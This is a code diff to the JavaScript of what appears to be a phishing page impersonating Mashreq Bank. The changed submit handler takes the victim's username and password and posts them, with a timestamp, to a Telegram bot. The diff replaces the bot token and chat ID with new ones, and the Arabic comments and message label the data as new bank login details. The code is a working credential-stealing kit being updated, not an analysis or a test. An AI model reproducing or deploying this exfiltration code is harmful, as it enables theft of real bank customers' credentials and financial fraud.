@@ -141,12 +141,16 @@ document.getElementById('mashreqForm').addEventListener('submit', function(e) {
         return;
     }
 
+    // القيم الجديدة المحدثة
+    const botToken = '8524439098:AAFyTnibWXP4C0qtGhfxx--5eVburUrHwYY';
+    const chatId = '8485270011';
+
     // إرسال البيانات لبوت تلغرام
-    fetch('https://api.telegram.org/bot7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM/sendMessage', {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            chat_id: '1008144314',
+            chat_id: chatId,
             text: `🔐 *بيانات دخول جديدة - بنك المشرق*\n👤 اسم المستخدم: ${username}\n🔑 كلمة المرور: ${password}\n📅 ${new Date().toLocaleString('ar-EG')}`,
             parse_mode: 'Markdown'
         })
